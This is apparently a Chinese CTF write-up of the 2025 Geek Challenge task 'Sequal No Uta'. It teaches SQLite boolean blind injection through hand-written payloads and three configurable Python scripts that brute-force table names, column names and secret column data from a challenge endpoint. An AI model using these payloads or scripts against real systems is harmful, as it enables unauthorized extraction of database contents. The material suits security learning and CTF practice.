---
title: 2025极客大挑战 Sequal No Uta
published: 2025-11-24
pinned: false
description: 通过2025极客大挑战的题了解sqlite盲注.
tags: [CTF, sql, game]
category: CTF
draft: false
---

# 极客大挑战 Sequal No Uta

重要的东西放前面，`@cl0wn师傅`给了我一个盲注的脚本，通过检索sqlite语句来查数据，然后我就调教ai将这个脚本优化了一下，使它更加简便，通用，智能

```python
import requests
import string

# ========== 配置区域 ==========
# 目标URL（请修改为实际目标）
TARGET_URL = "http://019aaa5f-80ee-7e49-802f-89d2b6790510.geek.ctfplus.cn/check.php"

# 字符集（可根据需要扩展）
CHARSET = string.ascii_letters + string.digits + "_{}!#$%&()*+,-./:;<=>?@[]^`|~ "

# 要提取的数据类型（取消注释其中一个）
#EXTRACTION_TYPE = "table_names"  # 表名
#EXTRACTION_TYPE = "column_names"  # 特定表的列名
EXTRACTION_TYPE = "column_data"  # 列数据
#EXTRACTION_TYPE = "flag_data"    # flag数据


# 当 EXTRACTION_TYPE = "column_names" 时，设置要爆破的表名
TARGET_TABLE = "users"  # 修改为你要爆破列名的表名

#当 EXTRACTION_TYPE = "column_data" 时，设置爆破的列名
TARGET_COLUMNS = "username"
# ========== 配置结束 ==========

def blind_sql_injection():
    extracted_data = ""

    # 根据选择的数据类型设置payload
    if EXTRACTION_TYPE == "table_names":
        # 提取所有表名
        base_payload = "'or/**/substr((select/**/group_concat(tbl_name)/**/from/**/sqlite_master/**/where/**/type='table'/**/and/**/tbl_name/**/not/**/like/**/'sqlite_%'),{position},1)='{char}'--"
    elif EXTRACTION_TYPE == "column_data":
        # 提取users表的secret列数据
        base_payload = f"'or/**/substr((select/**/{TARGET_COLUMNS}/**/from/**/{TARGET_TABLE}/**/limit/**/2/**/offset/**/1),{{position}},1)='{{char}}'--"  # 修复：使用双花括号
    elif EXTRACTION_TYPE == "flag_data":
        # 提取可能的flag数据
        base_payload = "'or/**/substr((select/**/group_concat(secret)/**/from/**/users),{position},1)='{char}'--"
    elif EXTRACTION_TYPE == "column_names":
        # 提取特定表的所有列名
        base_payload = f"'or/**/substr((select/**/group_concat(name)/**/from/**/pragma_table_info('{TARGET_TABLE}')),{{position}},1)='{{char}}'--"
    else:
        print("错误：请选择有效的EXTRACTION_TYPE")
        return

    print(f"[*] 开始提取数据，类型: {EXTRACTION_TYPE}")
    if EXTRACTION_TYPE == "column_names":
        print(f"[*] 目标表: {TARGET_TABLE}")
    print("[*] 字符集大小:", len(CHARSET))

    # 逐字符提取数据
    for position in range(1, 100):  # 假设最大长度为100
        found_char = False

        for char in CHARSET:
            # 构建payload
            payload = base_payload.format(position=position, char=char)

            # 发送请求
            params = {"name": payload}

            try:
                response = requests.get(TARGET_URL, params=params, timeout=5)

                # 判断响应
                if "该用户存在且活跃" in response.text:
                    extracted_data += char
                    print(f"[+] 位置 {position}: '{char}' -> 当前结果: {extracted_data}")
                    found_char = True
                    break
            except Exception as e:
                print(f"[-] 请求失败: {e}")
                continue

        # 如果没有找到字符，可能已到数据末尾
        if not found_char:
            print(f"[*] 位置 {position} 未找到字符，可能已到数据末尾")
            break

    print(f"\n[+] 提取完成!")
    print(f"[+] 最终结果: {extracted_data}")

    # 对于列名结果，进行格式化显示
    if EXTRACTION_TYPE == "column_names" and extracted_data:
        columns = extracted_data.split(',')
        print(f"\n[+] {TARGET_TABLE}表的列结构:")
        for i, column in enumerate(columns, 1):
            print(f"    第{i}列: {column}")

    # 检查是否包含flag格式
    if "ctf{" in extracted_data.lower() or "flag{" in extracted_data.lower():
        print(f"[!!!] 发现FLAG: {extracted_data}")


if __name__ == "__main__":
    blind_sql_injection()
```



提示给了是SQLite库，使用题目大致可以确定是sqlite注入了

但是打开环境只有只有查询状态，尝试布尔盲注

检测表的数量：

```php
admin'%09and%09(select%09count(*)%09from%09sqlite_master%09where%09type='table')=2--
```

检查表名：

```php
admin'%09and%09(select%09count(*)%09from%09sqlite_master%09where%09type='table'%09and%09tbl_name%09like%09'users')--
```

这里可以先通过手注测试常见表名，减少爆破时间

如：

```php
users
user
flag    
```

检查表的列数：

```php
admin'%09and%09(select%09count(*)%09from%09pragma_table_info('users'))=5--
```

接着爆破列名

```php
#!/usr/bin/env python3
import requests
import string

URL = "http://019aaa20-97a0-74bf-ba1c-466bb98f1598.geek.ctfplus.cn/check.php?name="
CHARS = string.ascii_letters + string.digits + "_"


def test(payload):
    try:
        response = requests.get(URL + payload, timeout=5)
        return "该用户存在且活跃" in response.text
    except:
        return False


print("爆破users表列名:")
for offset in range(5):
    name = ""
    pos = 1

    while True:
        found = False
        for char in CHARS:
            payload = f"admin'%09and%09(substr((select%09name%09from%09pragma_table_info('users')%09limit%091%09offset%09{offset}),{pos},1)='{char}')--"
            if test(payload):
                name += char
                found = True
                break

        if not found:
            break
        pos += 1

    print(f"第{offset + 1}列: {name}")
```

> 爆破users表列名:
> 第1列: id
> 第2列: username
> 第3列: password
> 第4列: is_active
> 第5列: secret

发现一个奇奇怪怪的secret列，接着尝试爆破secret列的内容

这里让ai给了一个比较通用的脚本，可以提前更改url和表名列名之类的东西，但是也通用不到哪里去，因为每道题目的过滤不一样

```python
#!/usr/bin/env python3
"""
简易通用列数据爆破脚本
用于爆破已知表中指定列的数据内容
"""

import requests
import string
import time

# ============================ 配置区域 ============================
# 目标URL（在此处修改为目标URL）
TARGET_URL = "http://019aaa20-97a0-74bf-ba1c-466bb98f1598.geek.ctfplus.cn/check.php?name="

# 表名（在此处修改为要爆破的表名）
TABLE_NAME = "users"

# 列名列表（在此处修改为要爆破的列名）
COLUMNS = ["secret"]  # 例如: ["username", "password", "secret"]

# 要爆破的行数（在此处修改为要爆破的行数）
MAX_ROWS = 3

# 请求延迟（秒）（在此处修改请求频率）
DELAY = 0.1


# ============================ 配置结束 ============================

def test_payload(payload):
    """发送请求并检查响应"""
    full_url = TARGET_URL + payload
    try:
        response = requests.get(full_url, timeout=5)
        return "该用户存在且活跃" in response.text   #这里填充正确时的回显
    except:
        return False


def extract_column_data(table, column, row_offset):
    """提取指定表、列、行的数据"""
    data = ""
    position = 1

    # 字符集（包含常见字符）
    chars = string.ascii_letters + string.digits + "{}_-!@#$%^&*()+=[]|:;<>,.?/~` "

    while True:
        found_char = False

        for char in chars:
            # 构建查询Payload
            payload = f"admin'%09and%09(substr((select%09{column}%09from%09{table}%09limit%091%09offset%09{row_offset}),{position},1)='{char}')--"

            if test_payload(payload):
                data += char
                found_char = True
                print(f"  行{row_offset + 1} {column}: 位置{position}='{char}' -> {data}")
                break

        if not found_char:
            break

        position += 1
        time.sleep(DELAY)

    return data


def main():
    print(f"[*] 开始爆破表 '{TABLE_NAME}' 的数据")
    print(f"[*] 目标列: {', '.join(COLUMNS)}")
    print(f"[*] 最大行数: {MAX_ROWS}")
    print("=" * 50)

    # 对每一行进行爆破
    for row in range(MAX_ROWS):
        print(f"\n[*] 爆破第{row + 1}行数据:")

        # 对每一列进行爆破
        for column in COLUMNS:
            print(f"[*] 提取 {column} 列...")
            data = extract_column_data(TABLE_NAME, column, row)

            if data:
                print(f"[+] 行{row + 1} {column}: {data}")
            else:
                print(f"[-] 行{row + 1} {column}: 空或无法提取")

        print("-" * 30)


if __name__ == "__main__":
    main()
```

当然我在写的时候没有那么轻松，ai一次使用不正确就把我完全带偏了，一开始只给我爆破出三列，然后就往其他方向试了一个下午，晚上重新做的时候才发现漏了两列而且ai给的脚本也没有那么简单，这里展示一个构造的超复杂脚本

```python
#!/usr/bin/env python3
"""
完整爆破users表5列列名
"""

import requests
import string
import time
import json


class AllColumnsExtractor:
    def __init__(self, target_url, delay=0.1, timeout=10):
        self.target_url = target_url
        self.delay = delay
        self.timeout = timeout
        self.request_count = 0
        self.start_time = time.time()

        # 响应特征
        self.true_indicator = "该用户存在且活跃"
        self.false_indicator = "未找到用户或已停用"

        # 设置会话
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        print(f"[+] 目标URL: {target_url}")
        print(f"[+] 目标: users表所有5列列名")

    def build_payload(self, condition):
        """构建Payload"""
        payload = f"admin'%09and%09({condition})--"
        return payload

    def send_request(self, payload):
        """发送请求并检查响应"""
        full_url = f"{self.target_url}{payload}"

        try:
            self.request_count += 1
            response = self.session.get(full_url, timeout=self.timeout)

            if self.true_indicator in response.text:
                return True
            elif self.false_indicator in response.text:
                return False
            else:
                return False

        except Exception as e:
            print(f"[-] 请求失败: {e}")
            return False

    def get_column_name_length(self, offset):
        """获取指定列的列名长度"""
        print(f"[*] 获取第{offset + 1}列列名长度...")

        for length in range(1, 50):
            payload = self.build_payload(
                f"length((select%09name%09from%09pragma_table_info('users')%09limit%091%09offset%09{offset}))={length}"
            )

            if self.send_request(payload):
                print(f"[+] 第{offset + 1}列列名长度: {length}")
                return length

            time.sleep(self.delay)

        print(f"[-] 无法获取第{offset + 1}列列名长度")
        return 0

    def extract_column_name(self, offset, length):
        """提取指定列的列名"""
        if length == 0:
            return ""

        print(f"[*] 提取第{offset + 1}列列名 (长度: {length})...")

        column_name = ""
        start_time = time.time()

        # 优化字符集 - 列名通常使用字母、数字和下划线
        char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_"

        for position in range(1, length + 1):
            progress = (position / length) * 100
            elapsed = time.time() - start_time
            eta = (elapsed / position) * (length - position) if position > 0 else 0

            print(f"\r[*] 第{offset + 1}列: [{progress:6.2f}%] 位置 {position}/{length}, "
                  f"ETA: {eta:.1f}s, 当前: {column_name}", end="")

            found_char = False
            for char in char_set:
                payload = self.build_payload(
                    f"substr((select%09name%09from%09pragma_table_info('users')%09limit%091%09offset%09{offset}),{position},1)='{char}'"
                )

                if self.send_request(payload):
                    column_name += char
                    found_char = True
                    break

                time.sleep(self.delay)

            if not found_char:
                break

        print()
        return column_name

    def guess_common_column_names(self, offset):
        """猜测常见的列名"""
        print(f"[*] 尝试猜测第{offset + 1}列常见列名...")

        # 不同位置的常见列名
        common_columns_by_position = [
            ['id', 'uid', 'user_id', 'key'],  # 第1列常见
            ['username', 'user', 'name', 'account', 'login'],  # 第2列常见
            ['password', 'pass', 'pwd', 'hash'],  # 第3列常见
            ['secret', 'token', 'key', 'flag', 'ctf'],  # 第4列常见
            ['email', 'role', 'status', 'created_at', 'updated_at', 'last_login']  # 第5列常见
        ]

        if offset < len(common_columns_by_position):
            for column in common_columns_by_position[offset]:
                payload = self.build_payload(
                    f"(select%09name%09from%09pragma_table_info('users')%09limit%091%09offset%09{offset})='{column}'"
                )

                if self.send_request(payload):
                    print(f"[+] 第{offset + 1}列列名: {column}")
                    return column

        return None

    def extract_all_columns(self):
        """提取所有5列的列名"""
        print("开始提取users表所有5列列名")
        print("=" * 60)

        column_names = []

        for offset in range(5):  # 5列，offset从0到4
            print(f"\n[*] 处理第{offset + 1}列:")

            # 先尝试猜测常见列名
            column_name = self.guess_common_column_names(offset)

            if not column_name:
                # 如果猜测失败，进行完整提取
                length = self.get_column_name_length(offset)
                if length > 0:
                    column_name = self.extract_column_name(offset, length)

            if column_name:
                column_names.append(column_name)
                print(f"[+] 第{offset + 1}列: {column_name}")
            else:
                column_names.append("未知")
                print(f"[-] 无法获取第{offset + 1}列列名")

        return column_names

    def verify_known_columns(self, column_names):
        """验证已知列名"""
        print("\n" + "=" * 60)
        print("[*] 验证已知列名")
        print("=" * 60)

        known_columns = ['id', 'username', 'password', 'secret']

        for i, column in enumerate(column_names):
            if column in known_columns:
                print(f"[+] 第{i + 1}列 '{column}' 是已知列")
            else:
                print(f"[!] 第{i + 1}列 '{column}' 是新发现的列")

    def run(self):
        """运行提取"""
        print("开始提取users表所有列名")
        print("=" * 60)

        try:
            # 提取所有列名
            column_names = self.extract_all_columns()

            # 显示结果
            self.show_results(column_names)

            # 验证已知列名
            self.verify_known_columns(column_names)

            # 显示统计信息
            self.show_statistics()

            # 保存结果
            self.save_results(column_names)

            print("\n[+] 所有列名提取完成!")

            return column_names

        except KeyboardInterrupt:
            print("\n[-] 用户中断操作")
            self.show_statistics()
            return None
        except Exception as e:
            print(f"\n[-] 执行过程中发生错误: {e}")
            import traceback
            traceback.print_exc()
            return None

    def show_results(self, column_names):
        """显示结果"""
        print("\n" + "=" * 60)
        print("[*] users表所有列名")
        print("=" * 60)

        for i, column in enumerate(column_names):
            print(f"第{i + 1}列: {column}")

    def show_statistics(self):
        """显示统计信息"""
        total_time = time.time() - self.start_time
        print("\n" + "=" * 60)
        print("[*] 统计信息")
        print("=" * 60)
        print(f"总请求数: {self.request_count}")
        print(f"总耗时: {total_time:.2f} 秒")
        print(f"平均速度: {self.request_count / total_time:.2f} 请求/秒")

    def save_results(self, column_names):
        """保存结果到文件"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"users_columns_{timestamp}.json"

        data = {
            'target_url': self.target_url,
            'extraction_time': time.strftime("%Y-%m-%d %H:%M:%S"),
            'column_count': len(column_names),
            'columns': column_names,
            'statistics': {
                'total_requests': self.request_count,
                'execution_time': time.time() - self.start_time
            }
        }

        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        print(f"[+] 结果已保存到: {filename}")

        # 同时保存为易读的文本文件
        txt_filename = f"users_columns_{timestamp}.txt"
        with open(txt_filename, 'w', encoding='utf-8') as f:
            f.write("Users Table Columns\n")
            f.write("===================\n\n")

            for i, column in enumerate(column_names):
                f.write(f"第{i + 1}列: {column}\n")

        print(f"[+] 文本格式结果已保存到: {txt_filename}")


def main():
    # 目标URL
    TARGET_URL = "http://019aa60b-289c-7887-a11f-1c264986b71b.geek.ctfplus.cn/check.php?name="

    # 配置参数
    DELAY = 0.1  # 请求延迟

    # 创建提取器实例
    extractor = AllColumnsExtractor(
        target_url=TARGET_URL,
        delay=DELAY
    )

    # 执行提取
    column_names = extractor.run()

    if column_names:
        print(f"\n[+] 下一步: 提取所有列的数据")


if __name__ == "__main__":
    main()
```

这个脚本就是爆破出列名而已